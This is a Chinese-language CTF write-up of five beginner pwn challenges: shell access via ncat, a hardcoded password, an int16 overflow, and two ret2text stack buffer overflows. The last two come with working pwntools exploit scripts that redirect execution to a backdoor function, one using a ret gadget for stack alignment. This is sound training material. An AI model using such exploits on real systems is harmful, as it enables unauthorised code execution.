# 251015 Writeup

## P1
好像是很简单的一道题，但出于没事找事的目的，我们用 IDA 看一下给的附件。对着汇编代码按 Tab。

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760709884583-d0322c65-70ef-450a-92af-ed4953affd0b.png)

可以看到这个程序就是启动了 shell 而已，那么我们对 shell 进行操作即可。启动靶机，用 netcat 连接。

> Arch Linux 安装 netcat：`sudo pacman -S nmap`

执行 `ncat node5.buuoj.cn 28980`（端口号以实际为准）：

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760709891483-b94be118-0b05-485a-98f1-aafef4914b06.png)

没有命令提示符，尝试直接交互。使用 `pwd` 得知当前目录为 `/`。使用 `ls` 得到根目录下文件列表：

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760709897450-9b4cb4f8-c2ce-4354-8e95-5e98f88efa1a.png)

发现有 `flag` 文件，执行 `cat flag` 打印文件内容，得到 flag。

如果觉得一堆东西眼花缭乱看不过来，那就在自己的机器上运行 `ls /`，了解一下一个 Linux 系统的根目录内一般有些什么目录。

## P2
使用 IDA 分析可执行文件。

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760709906459-ea040c8d-a3fb-4e8d-9313-9dd544711c65.png)

口令就写在源码里面。在平台上操作「下发赛题」，用 netcat 连接，输入密码拿到 shell，`cat flag` 即可。

## P3
### IDA 分析
#### `main`
![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760709911257-4edf7080-ad73-4e14-b7b8-6180949f39a4.png)

#### `func`
![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760709919543-097e2b84-2d14-44f8-b34c-7f27a4835e79.png)

`func` 的逻辑即让你不断输入正数，每输入一次，`v1` 自增，当 `v1` 为负数时拿到 flag。注意到 `v1` 为 int16 类型，达到 32767 即可溢出得到负数，那么只要不断输入正数即可。

### 解答
~~因此我们采取输入三万两千七百六十八次正数的方法即可。~~ 因此我们用 `yes` 命令持续输入正数即可。点击下发赛题，连接靶机并往控制台写入内容（IP 和端口号以实际为准）：

```shell
yes 114514 | ncat 39.106.57.152 22846
```

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760709925040-10edee5f-3182-4a2e-abb3-8a386603e318.png)

成功拿到 flag。按 Ctrl+C，终止程序。

## P4
先分析可执行文件。

### Checksec 分析
`checksec --file=ret2text2`

```plain
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH        Symbols                FORTIFY        Fortified        Fortifiable        FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   71 Symbols          No        0                1        ret2text2
```

`No PIE`，说明程序加载地址是固定的，可以直接硬编码或静态计算目标函数的地址。

### IDA 分析
#### `main`
![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760709938336-34c18418-6558-4a2b-ac21-7f837f2e7dd0.png)

#### `vuln`
![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760709943003-ae61cc3c-286f-48ea-937f-fbab75b9dc80.png)

#### `backdoor`
注意到程序中还留有一个 `backdoor` 函数，作用是打开 shell：

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760709951935-0df1dc93-5df7-4db2-a285-641849199383.png)

### 逻辑分析
注意到 `vuln` 函数中声明了一个 256 字节大小的字符数组 `buf`，但 `read` 读入了 0x140 即 320 个字符，多出 64 字节，存在缓冲区溢出问题。看 IDA 给 `buf` 的注释 `// [rsp+0h] [rbp-100h] BYREF`，`buf` 距离 `rbp` 有 0x100 即 256 字节。我们的目的是将函数的返回地址（`rbp+8h`）覆盖为 `backdoor` 函数的地址，实现跳转到 `backdoor` 函数，因此需要先写入 0x108 即 264 字节的无效数据。对着 **IDA View-A** 标签页按_空格_，找到 `backdoor` 函数的地址 `00000000004011CA`，如图：

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760709958601-d29c28be-5824-4d81-b233-b8a45844fe78.png)

现在可以编写 payload 了，在 LLM 的帮助下编写了如下的代码：

```python
from pwn import *

context(log_level="debug", arch="amd64", os="linux")
p = process("./ret2text2")

# 目标地址：backdoor 函数的精确入口
BACKDOOR_ADDR = 0x4011CA

# 栈偏移量：256 (buf) + 8 (saved RBP)
PADDING_SIZE = 264

# 1. 构造 Payload
padding = b'A' * PADDING_SIZE
ret_addr = p64(BACKDOOR_ADDR) # 使用 p64 打包地址（小端序）

payload = padding + ret_addr

log.success(f"Payload ready. Size: {len(payload)} bytes")

# 2. 发送并获得 Shell
p.sendline(payload)
p.interactive()
```

运行测试：

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760708462195-ff9d918f-545c-4ce3-a3a3-3e6686a9e705.png)

出现错误了！查询相关信息可知：

> 在 **x64** 调用约定中，调用者（Caller）必须确保在执行 **`call`** 指令时，栈指针 `RSP` 是 **16 字节对齐**的。
>
> 当 Payload 覆盖返回地址并跳转到 `0x4011CA` (backdoor) 时，`RSP` 此时指向的是 `backdoor` 的返回地址（即您 Payload 中 0x4011CA 之后的内容，通常是 EOF，或者您希望执行的下一个 gadget）。
>
> `backdoor` 接着执行 `push rbp`。这会将栈指针 `RSP` 再减少 8 字节。
>
> 如果 **`call _system`** 执行前的 `RSP` 不是 **16 字节对齐**的，程序可能会在 `system` 函数内部崩溃。
>
> 如果需要执行 `backdoor` 函数中的代码，但又担心对齐问题，一个常见的做法是在返回地址之后添加一个 ROP gadget 来解决。
>
> 在 ret2text 场景中，最简单的解决方案是：**在跳转到 `backdoor` 之前，先执行一个 `ret` 指令。**

在 `0x40101A` 处有一个 `retn` 指令，在 x64 中和 `ret` 作用相同：

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760708462294-7c8b3d9a-ddae-4b92-9834-d9d0f83363ae.png)

将上方代码的 L16 修改为 `payload = padding + p64(0x40101A) + ret_addr`，在 `backdoor` 之前插入一个 `ret` 指令。再运行，可以拿到 shell，可以弹个计算器看看：

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760708462734-f7c68a02-3353-403f-bc7b-b398e9bd60f4.png)

## P5
初步分析流程大同小异，此处略过。

### IDA 分析
#### `main`
![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760708462836-1459734e-1e8a-4332-8350-e232425afe80.png)

#### `overflow`
![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760708463225-a43e6425-da5e-461e-ba30-cf96f07c7bc6.png)

我们看到了 gets 函数。如果你以前写过 C，可能会听说过 gets。这个函数在 C99 标准中被弃用，并在 C11 中被移除，正是因为它不能给定最大读取的字符数量，导致了缓冲区溢出问题。v1 距离 `rbp` 有 `20h`，这里往后写 `20h+8h` 的数据就能写到返回地址了。

#### `gift` 和 `fun`
![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760712377491-76f5ef61-5283-4b36-9ea2-bd697fef73e3.png)![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760710411958-3eaa3b99-7f29-4561-9206-8a2e8211750c.png)

在左边函数列表里看到了两个可疑的函数。`gift` 不是想要的，它只是输出 `/bin/sh` 而已，需要的是 `fun`。用 IDA 查看 `fun` 的地址，为 `0x401257`，如法炮制编写 payload。

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760712473675-8bdb54b6-51c7-4628-89a2-13c489d739bf.png)

```python
from pwn import *

context(log_level="debug", arch="amd64", os="linux")
p = process("./ret2text1")

# 目标地址：backdoor 函数的精确入口
BACKDOOR_ADDR = 0x401257

# 栈偏移量：32 (buf) + 8 (saved RBP)
PADDING_SIZE = 40

# 1. 构造 Payload
padding = b'A' * PADDING_SIZE
ret_addr = p64(BACKDOOR_ADDR) # 使用 p64 打包地址（小端序）

payload = padding + ret_addr

log.success(f"Payload ready. Size: {len(payload)} bytes")

# 2. 发送并获得 Shell
p.sendline(payload)
p.interactive()
```

执行，成功：

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760712665182-ff2825a1-f6cc-4b2a-bfa6-ae4876b2a18b.png)

---

<https://khyan.top>

![](https://cdn.nlark.com/yuque/0/2025/png/61818612/1760710415689-1eb3208a-14e9-4e91-a0dc-d698fc962dd4.png)

